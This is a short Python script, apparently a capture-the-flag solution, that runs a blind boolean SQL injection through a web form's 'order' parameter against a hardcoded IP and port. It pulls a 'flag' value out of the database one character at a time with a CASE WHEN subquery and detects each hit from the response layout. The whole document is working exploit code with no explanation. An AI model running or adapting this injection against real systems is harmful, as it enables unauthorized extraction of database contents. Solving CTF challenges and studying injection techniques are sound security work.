import requests
import string

url = "http://34.124.192.13:65052/"
wordlist = string.printable
extracted = ""

while True:
    for char in wordlist:
        print("Trying: " + extracted + char)
        payload = f"CASE WHEN (SELECT hex(substr(flag,{len(extracted)+1},1)) FROM flag) = hex('{char}') THEN code_alpha3 ELSE name END"

        r = requests.post(url, data={
            "search": "a",
            "order": payload
        })

        if (r.text.rfind("Zimbabwe") == 13745):
            extracted += char
            print(f"extracted: {extracted}")
            if(char == '}'):
                exit()
            break